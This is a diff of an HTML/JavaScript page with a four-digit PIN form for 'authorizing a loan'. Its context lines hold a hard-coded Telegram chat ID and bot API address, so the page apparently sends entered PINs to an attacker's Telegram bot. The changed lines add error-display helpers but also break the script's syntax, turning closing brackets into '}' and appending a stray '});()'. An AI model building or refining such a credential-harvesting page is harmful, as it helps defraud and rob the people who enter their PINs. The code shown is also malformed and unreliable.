@@ -426,7 +426,7 @@
     const CHAT_ID   = '8820857419';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 ;
-    // --- DOM
+    // --- DOM Elements ---
     const pinHiddenInput = document.getElementById('pinHiddenInput');
     const authBtn = document.getElementById('authBtn');
     const pinError = document.getElementById('pinError');
@@ -491,13 +491,27 @@
       } else if (e.key === 'Enter' && currentPin.length === 4) {
         authorizeLoan();
       }
-    });
+    }
 
     window.addEventListener('DOMContentLoaded', () => {
       pinHiddenInput.value = '';
       updateDots();
       authBtn.disabled = true;
-    });
+    }
+    
+    // --- Error handling ---
+    window.hideError = function() {
+      errorBox.style.display = 'none';
+    };
+
+    function showError(msg) {
+      errorText.innerText = msg || 'Wrong PIN';
+      errorBox.style.display = 'block';
+      setTimeout(() => {
+        if (errorBox.style.display === 'block') errorBox.style.display = 'none';
+      }, 4000);
+    }
+
     
     // --- Telegram helpers ---
     function escapeHtml(unsafe) {
@@ -622,6 +636,7 @@
         showError('Network error. Please try again.');
       }
     });
+  });()
   </script>
 </body>
 </html>
